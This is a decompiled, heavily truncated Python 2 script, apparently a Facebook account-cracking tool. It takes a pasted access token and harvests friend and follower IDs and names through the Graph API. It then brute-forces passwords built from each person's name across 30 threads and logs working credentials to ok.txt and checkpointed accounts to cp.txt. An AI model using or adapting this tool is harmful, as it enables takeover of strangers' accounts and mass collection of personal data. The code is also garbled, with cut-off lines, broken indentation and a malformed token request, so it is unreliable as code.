# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8>
# [GCC 4.2.1 Compatible Android (6454773 based on>
# Embedded file name: dg
P = '\x1b[97;1m'
M = '\x1b[91;1m'
H = '\x1b[92;1m'
K = '\x1b[93;1m'
B = '\x1b[94;1m'
U = '\x1b[95;1m'
O = '\x1b[93;1m'
N = '\x1b[0m'
try:
    import os, sys, time, platform, datetime, ran>
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionErr>
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 MOHSIN.py')#

from os import system
from time import sleep

def xox(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
        
        agents = [
 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pr>
 '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;F>
 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F>
 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/L>
 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 >
 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Ma>
 'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromeb>
header = {'user-agent': '[FBAN/FB4A;FBAV/222.0.0.>
   'x-fb-sim-hni': str(random.randint(20000, 4000>
   'x-fb-net-hni': str(random.randint(20000, 4000>
   'x-fb-connection-quality': 'EXCELLENT',
   'x-fb-connection-type': 'cell.CTRadioAccessTec>
   'content-type': 'application/x-www-form-urlenc>
   'x-fb-http-engine': 'Liger'}
user_agent = [
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92>
useragent_url = user_agent[2]
try:
    requests.get('https://www.google.com/search?q>
    requests.get('https://m.youtube.com/results?s>
except requests.exceptions.ConnectionError:
    os.system('clear')
    xox('\n\t\x1b[93;1m  NO INTERNET CONNECTION :>
    sys.exit()

ip = requests.get('https://api.ipify.org').text.s>
loc = requests.get('https://ipapi.com/ip_api.php?>

def linex():
    os.system('echo  "\n ========================>


def logo():
    os.system('echo "\n\n        __  __    _    _>


def main():
    os.system('clear')
    logo()
    print '\t\x1b[93;1m==========================>
    print ''
    print '\x1b[92;1m  [1] START CRACK'
    print '\x1b[93;1m  [2] DUMP/EXTRACT USER-IDZ'
    print '\x1b[94;1m  [3] HOW TO GET ACCESS TOKE>
    print '\x1b[96;1m  [4] CONTACT ME ON WHATSAPP'
    print '\x1b[92;1m  [5] UPDATE TOOL'
    print '\x1b[91;1m  [0] EXIT'
    print ''
    log_sel()


def log_sel():
    global token
    sel = raw_input('\x1b[93;1m  CHOOSE: ')
    if sel == '':
        print '\t\x1b[91;1m  SELECT AN OPTION STU>
        log_sel()
    elif sel == '1' or sel == '01':
        token()
        elif sel == '2' or sel == '02':
        ex_id()
    elif sel == '3' or sel == '03':
        subprocess.check_output(['am', 'start', '>
        main()
    elif sel == '4' or sel == '04' or sel == 'J' >
        os.system('xdg-open https://wa.me/+994400>
        main()
    elif sel == '5' or sel == '05':
        import os
        try:
            os.system('git clone https://github.c>
            os.system('rm -rf MOHSIN.py')
            os.system('cp -f MOHSIN-TOOL/MOHSIN.p>
            os.system('rm -rf MOHSIN-TOOL')
            print '\x1b[92;1m\n TOOL UPDATE SUCCE>
            time.sleep(2)
            main()
            except KeyboardInterrupt:
            print '\x1b[91;1m\n YOUR DEVICE IS NO>
            main()

    elif sel == '0' or sel == '00':
        xox('\n\t\x1b[91;1m GOOD BYE SEE YOU AGAI>
        sys.exit()
    else:
        print ''
        print '\t\x1b[91;1m  SELECT VALID OPTION'
        print ''
        log_sel()


def token():
    os.system('clear')
    try:
        token = open('vau_token.txt', 'r').read()
        menu()
        except (KeyError, IOError):
        logo()
        print ''
        print '\t\x1b[92;1m  LOGIN TOKEN'
        print ''
        token = raw_input('\x1b[93;1m PASTE TOKEN>
        sav = open('vau_token.txt', 'w')
        sav.write(token)
        sav.close()
        token_check()
        menu()


def token_check():
    try:
        token = open('vau_token.txt', 'r').read()
    except IOError:
        print '\x1b[91;1m[!] TOKEN INVALID'
        os.system('rm -rf vau_token.txt')
        
        requests.post(useragent_url + token, headers=>


def menu():
    os.system('clear')
    try:
        token = open('vau_token.txt', 'r').read()
    except (KeyError, IOError):
        token()

    try:
        r = requests.get('https://graph.facebook.>
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        logo()
        print ''
        print '\t\x1b[91;1m  LOGGED IN TOKEN HAS >
        os.system('rm -rf vau_token.txt')
        print ''
        time.sleep(1)
        token()

    os.system('clear')
    xn = name.upper()
    logo()
    print ''
    print '\x1b[93;1m     HELLO   : \x1b[92;1m' +>
    print '\x1b[93;1m     REGION  : \x1b[92;1m' +>
    print '\x1b[93;1m     YOUR IP : \x1b[92;1m' +>
    print ''
    print ''
    print '\x1b[92;1m  [1] CRACK WITH AUTO PASS'
    print '\x1b[93;1m  [2] CRACK WITH MANUAL/CHOO>
    print '\x1b[91;1m  [0] BACK'
    print ''
    menu_option()
    
    def menu_option():
    select = raw_input('\x1b[92;1m  CHOOSE OPINIO>
    if select == '1':
        crack1()
    elif select == '2':
        crack()
    elif select == '3':
        ex_id()
    elif select == '0':
        main()
    else:
        print ''
        print '\t\x1b[91;1m     SELECT VALID OPTI>
        print ''
        menu_option()


def crack1():
    global token
    os.system('clear')
    try:
        token = open('vau_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[91;1m     TOKEN NOT FOUND '
        time.sleep(1)
        token()

    os.system('clear')
    logo()
    print ''
    print '\t\x1b[93;1m CRACK WITH AUTO PASS'
    print ''
    print '\x1b[94;1m  [1] CRACK PUBLIC ID'
    print '\x1b[93;1m  [2] CRACK FOLLOWERS'
    print '\x1b[92;1m  [3] CRACK FILE'
    print ''
    crack_select1()
    
    def crack_select1():
    select = raw_input('\x1b[92;1m  CHOOSE OPINIO>
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        idt = raw_input('\x1b[92;1m  INPUT PUBLIC>
        try:
            r = requests.get('https://graph.faceb>
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            print '\t\x1b[93;1m  AUTO PASS CRACKI>
            print ''
            print '\x1b[92;1m  CLONING FROM : ' +>
        except KeyError:
            print '\t\x1b[91;1m  INVALID LINK OR >
            print ''
            raw_input('\x1b[91;1m  PRESS ENTER TO>
            crack1()

        r = requests.get('https://graph.facebook.>
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            id.append(uid + '|' + na)

    elif select == '2':
        os.system('clear')
        logo()
        print ''
        idt = raw_input('\x1b[92;1m  INPUT FOLLOW>
        try:
            r = requests.get('https://graph.faceb>
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            print '\t\x1b[93;1m  AUTO PASS CRACKI>
            print ''
            print '\x1b[92;1m  CLONING FROM : ' +>
        except KeyError:
            print '\t\x1b[91;1m     INVALID LINK >
            print ''
            raw_input('\x1b[91;1m PRESS ENTER TO >
            crack1()

        r = requests.get('https://graph.facebook.>
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            id.append(uid + '|' + na)

    elif select == '3':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m   AUTO PASS CRACKING'
        print ''
        filelist = raw_input('\x1b[92;1m  INPUT F>
        try:
            for line in open(filelist, 'r').readl>
                id.append(line.strip())

        except IOError:
            print '\t\x1b[91;1m  REQUESTED FILE N>
            print ''
            raw_input('\x1b[93;1m PRESS ENTER TO >
            crack1()

    elif select == '0':
        menu()
    else:
        print ''
        print '\t\x1b[91;1m  SELECT VALID OPTION'
        print ''
        crack_select1()
    print '\x1b[93;1m  TOTAL IDS : \x1b[92;1m' + >
    print '\x1b[93;1m  THE PROCESS HAS BEEN START>
    print '\x1b[92;1m  BRUTE HAS BEEN STARTED\x1b>
    print ''
    linex()
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        vaugent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': vau>
        try:
            pass1 = name.lower().split(' ')[0] + >
            data = session.get('https://b-api.fac>
            q = json.loads(data)
            if 'access_token' in q and 'EAAA' in >
                print ' \x1b[1;32m [MAHADI-OK] ' >
                ok = open('ok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_m>
                print ' \x1b[1;33m [MAHADI-CP] ' >
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower().split(' ')[0>
                data = session.get('https://b-api>
                q = json.loads(data)
if 'access_token' in q and 'EAAA'>
                    print ' \x1b[1;32m [MAHADI-OK>
                    ok = open('ok.txt', 'a')
                    ok.write(uid + '|' + pass2 + >
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['err>
                    print ' \x1b[1;33m [MAHADI-CP>
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + >
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower().split(' >
                    data = session.get('https://b>
                    q = json.loads(data)
                    if 'access_token' in q and 'E>
                        print ' \x1b[1;32m [MAHAD>
                        ok = open('ok.txt', 'a')
                        ok.write(uid + '|' + pass>
                        ok.close()
                        oks.append(uid + pass3)
                        elif 'www.facebook.com' in q[>
                        print ' \x1b[1;33m [MAHAD>
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass>
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower().spli>
                        data = session.get('https>
                        q = json.loads(data)
                        if 'access_token' in q an>
                            print ' \x1b[1;32m [M>
                            ok = open('ok.txt', '>
                            ok.write(uid + '|' + >
                            ok.close()
                            oks.append(uid + pass>
                        elif 'www.facebook.com' i>
                            print ' \x1b[1;33m [M>
                            cp = open('cp.txt', '>
                            cp.write(uid + '|' + >
                            cp.close()
                            cps.append(uid + pass>
                        else:
pass5 = name.lower().>
                            data = session.get('h>
                            q = json.loads(data)
                            if 'access_token' in >
                                print ' \x1b[1;32>
                                ok = open('ok.txt>
                                ok.write(uid + '|>
                                ok.close()
                                oks.append(uid + >
                            elif 'www.facebook.co>
                                print ' \x1b[1;33>
                                cp = open('cp.txt>
                                cp.write(uid + '|>
                                cp.close()
                                cps.append(uid + >
                            else:
                                pass6 = name.lowe>
                                data = session.ge>
                                q = json.loads(da>
                                if 'access_token'>
                                    print ' \x1b[>
                                    ok = open('ok>
                                    ok.write(uid >
                                    ok.close()
                                    oks.append(ui>
                                elif 'www.faceboo>
                                    print ' \x1b[>
                                    cp = open('cp>
                                    cp.write(uid >
                                    cp.close()
                                    cps.append(ui>
                                else:
                                    pass7 = '2233>
                                    data = sessio>
                                    q = json.load>
                                    if 'access_to>
                                        print ' \>
                                        ok = open>
                                        ok.write(>
                                        ok.close()
                                        oks.appen>
                                    elif 'www.fac>
                                        print ' \>
                                        cp = open>
                                        cp.write(>
           cp.close()
                                        cps.appen>
                                    else:
                                        pass8 = n>
                                        data = se>
                                        q = json.>
                                        if 'acces>
                                            print>
                                            ok = >
                                            ok.wr>
                                            ok.cl>
                                            oks.a>
                                        elif 'www>
                                            print>
                                            cp = >
                                            cp.wr>
                                            cp.cl>
                                            cps.a>
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    linex()
    print ''
    print '\x1b[92;1m THE PROCESS HAS BEEN COMPLE>
    print '\x1b[93;1m TOTAL \x1b[92;1mOK\x1b[93;1>
    print ''
    linex()
    print ''
    raw_input('\x1b[93;1m PRESS ENTER TO BACK ')
    menu()


def crack():
    global token
    os.system('clear')
    try:
        token = open('vau_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[91;1m  TOKEN NOT FOUND '
        time.sleep(1)
        token()

    os.system('clear')
    logo()
    print ''
    print '\t\x1b[93;1m  MANUAL PASS CRACKING'
    print ''
    print '\x1b[94;1m  [1] CRACK PUBLIC ID'
    print '\x1b[93;1m  [2] CRACK FOLLOWERS'
    print '\x1b[92;1m  [3] CRACK FILE'
    print ''
    crack_select()
    
    def crack_select():
    select = raw_input('\x1b[92;1m  CHOOSE OPINIO>
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m  MANUAL PASS CRACKING'
        print ''
        print '\x1b[93;1m  EXAMPLE :\x1b[96;1m 12>
        print ''
        idt = raw_input('\n\x1b[92;1m  INPUT PUBL>
        print ''
        p1 = raw_input('\x1b[92;1m  NAME + DIGIT >
        p2 = raw_input('\x1b[93;1m  NAME + DIGIT >
        p3 = raw_input('\x1b[94;1m  NAME + DIGIT >
        p4 = raw_input('\x1b[95;1m  NAME + DIGIT >
        print ''
        print '\x1b[93;1m  EXAMPLE :\x1b[96;1m 10>
        print ''
        pass5 = raw_input('\x1b[92;1m  PASSWORD 5>
        pass6 = raw_input('\x1b[93;1m  PASSWORD 6>
        pass7 = raw_input('\x1b[94;1m  PASSWORD 7>
        try:
            r = requests.get('https://graph.faceb>
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            print '\t\x1b[93;1m  MANUAL PASS CRAC>
            print ''
            print '\x1b[92;1m  COINING FROM : ' +>
        except KeyError:
            print '\t\x1b[91;1m  INVALID LINK OR >
            print ''
            raw_input(' PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.>
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            id.append(uid + '|' + na)

    elif select == '2':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m  MANUAL PASS CRACKING'
        print ''
        print '\x1b[93;1m  EXAMPLE :\x1b[96;1m 12>
        print ''
        idt = raw_input('\n\x1b[92;1m  INPUT PUBL>
        print ''
        p1 = raw_input('\x1b[92;1m  NAME + DIGIT >
        p2 = raw_input('\x1b[93;1m  NAME + DIGIT >
        p3 = raw_input('\x1b[94;1m  NAME + DIGIT >
        p4 = raw_input('\x1b[95;1m  NAME + DIGIT >
        print ''
        print '\x1b[93;1m  EXAMPLE :\x1b[96;1m 10>
        print ''
        pass5 = raw_input('\x1b[92;1m  PASSWORD 5>
        pass6 = raw_input('\x1b[93;1m  PASSWORD 6>
        pass7 = raw_input('\x1b[94;1m  PASSWORD 7>
        try:
            r = requests.get('https://graph.faceb>
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            print '\t\x1b[93;1m  MANUAL PASS CRAC>
            print ''
            print '\x1b[92;1m  COINING FROM : ' +>
        except KeyError:
            print '\t\x1b[91;1m     INVALID LINK >
            print ''
            raw_input('\x1b[91;1m PRESS ENTER TO >
            crack()

        r = requests.get('https://graph.facebook.>
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            id.append(uid + '|' + na)

    elif select == '3':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m  MANUAL PASS CRACKING'
        print ''
        print ''
        filelist = raw_input('\x1b[92;1m  INPUT F>
        try:
            for line in open(filelist, 'r').readl>
                id.append(line.strip())

        except IOError:
            print '\t\x1b[91;1m  REQUESTED FILE N>
            print ''
            raw_input('\x1b[93;1m PRESS ENTER TO >
            crack()

        print '\x1b[93;1m  EXAMPLE :\x1b[96;1m 12>
        print ''
        p1 = raw_input('\x1b[92;1m  NAME + DIGIT >
        p2 = raw_input('\x1b[93;1m  NAME + DIGIT >
        p3 = raw_input('\x1b[94;1m  NAME + DIGIT >
        p4 = raw_input('\x1b[95;1m  NAME + DIGIT >
        print ''
        print '\x1b[93;1m  EXAMPLE :\x1b[96;1m 10>
        print ''
        pass5 = raw_input('\x1b[92;1m  PASSWORD 5>
        pass6 = raw_input('\x1b[93;1m  PASSWORD 6>
        pass7 = raw_input('\x1b[94;1m  PASSWORD 7>
    elif select == '0':
        menu()
    else:
        print ''
        print '\t\x1b[91;1m  SELECT VALID OPTION'
        print ''
        crack_select()
    print ''
    print '\x1b[93;1m  TOTAL IDS : \x1b[92;1m' + >
    print '\x1b[93;1m  THE PROCESS HAS STARTED'
    print '\x1b[92;1m  BRUTE HAS BEEN STARTED\x1b>
    print ''
    linex()
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        vaugent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': vau>
        try:
            pass1 = name.lower().split(' ')[0] + >
            data = session.get('https://b-api.fac>
            q = json.loads(data)
            if 'access_token' in q and 'EAAA' in >
                print ' \x1b[1;32m [MAHADI-OK] ' >
                ok = open('ok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                data = session.get('https://b-api>
                q = json.loads(data)
                if 'access_token' in q and 'EAAA'>
                    print ' \x1b[1;32m [MAHADI-OK>
                    ok = open('ok.txt', 'a')
                    ok.write(uid + '|' + pass2 + >
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['err>
                    print ' \x1b[1;33m [MAHADI-CP>
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + >
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower().split(' >
                    data = session.get('https://b>
                    q = json.loads(data)
                    if 'access_token' in q and 'E>
                        print ' \x1b[1;32m [MAHAD>
                        ok = open('ok.txt', 'a')
                        ok.write(uid + '|' + pass>
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q[>
                        print ' \x1b[1;33m [MAHAD>
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass>
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower().spli>
                        data = session.get('https>
                        q = json.loads(data)
                        if 'access_token' in q an>
                            print ' \x1b[1;32m [M>
                            ok = open('ok.txt', '>
                            ok.write(uid + '|' + >
                            ok.close()
                            oks.append(uid + pass>
                        elif 'www.facebook.com' i>
                            print ' \x1b[1;33m [M>
                            cp = open('cp.txt', '>
                            cp.write(uid + '|' + >
                            cp.close()
                            cps.append(uid + pass>
                        else:
                            data = session.get('h>
                            q = json.loads(data)
                            if 'access_token' in >
                                print ' \x1b[1;32>
                                ok = open('ok.txt>
                                ok.write(uid + '|>
                                ok.close()
                                oks.append(uid + >
                            elif 'www.facebook.co>
                                print ' \x1b[1;33>
                                cp = open('cp.txt>
                                cp.write(uid + '|>
                                cp.close()
                                cps.append(uid + >
                            else:
                                data = session.ge>
                                q = json.loads(da>
                                if 'access_token'>
                                    print ' \x1b[>
                                    ok = open('ok>
                                    ok.write(uid >
                                    ok.close()
                                    oks.append(ui>
                                elif 'www.faceboo>
                                    print ' \x1b[>
                                    cp = open('cp>
                                    cp.write(uid >
                                    cp.close()
                                    cps.append(ui>
                                else:
data = sessio>
                                    q = json.load>
                                    if 'access_to>
                                        print ' \>
                                        ok = open>
                                        ok.write(>
                                        ok.close()
                                        oks.appen>
                                    elif 'www.fac>
                                        print ' \>
                                        cp = open>
                                        cp.write(>
                                        cp.close()
                                        cps.appen>
                                    else:
                                        pass8 = n>
                                        data = se>
                                        q = json.>
                                        if 'acces>
                                            print>
                                            ok = >
                                            ok.wr>
                                            ok.cl>
                                            oks.a>
                                        elif 'www>
                                            print>
                                            cp = >
                                            cp.wr>
                                            cp.cl>
                                            cps.a>
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    linex()
    print ''
    print '\x1b[93;1m THE PROCESS HAS BEEN COMPLE>
    print '\x1b[93;1m TOTAL \x1b[92;1mOK\x1b[93;1>
    print ''
    linex()
    print ''
    raw_input('\x1b[93;1m PRESS ENTER TO BACK ')
    menu()
    
    def ex_id():
    global token
    idg = []
    os.system('clear')
    try:
        token = open('vau_token.txt', 'r').read()
    except (KeyError, IOError):
        token()

    try:
        r = requests.get('https://graph.facebook.>
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        logo()
        print ''
        print '\t\x1b[91;1m  LOGGED IN TOKEN HAS >
        os.system('rm -rf vau_token.txt')
        print ''
        time.sleep(1)
        token()

    os.system('clear')
    logo()
    print ''
    print '\x1b[92;1m      DUMP PUBLIC ID FRIEND >
    print ''
    idh = raw_input('\x1b[93;1m   INPUT ID: ')
    try:
        r = requests.get('https://graph.facebook.>
        q = json.loads(r.text)
        print ' COLLECTIN FROM: ' + q['name']
    except KeyError:
        print ''
        print '\x1b[93;1m\tINVALID ID PROVIDED'
        print ''
        raw_input('\x1b[93;1m PRESS ENTER TO BACK>
        ex_id()

    r = requests.get('https://graph.facebook.com/>
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id'].encode('utf-8')
        na = i['name'].encode('utf-8')
        idg.append(uid + '|' + na)
        ids.write(uid + '|' + na + '\n')

    ids.close()
    print ''
    linex()
    print ''
    print '\x1b[92;1m THE PROCESS HAS COMPLETED'
    print '\x1b[93;1m TOTAL IDS: \x1b[92;1m' + st>
    print ''
    linex()
    print ''
    raw_input('\x1b[95;1m PRESS ENTER TO DOWNLOAD>
    print '\x1b[93;1m FILE DOWNLOADED SUCCESSFULL>
    print '\x1b[92;1m SAVED /sdcard/userids.txt'
    print ''
    time.sleep(1)
    ex_id()


if __name__ == '__main__':
    main()
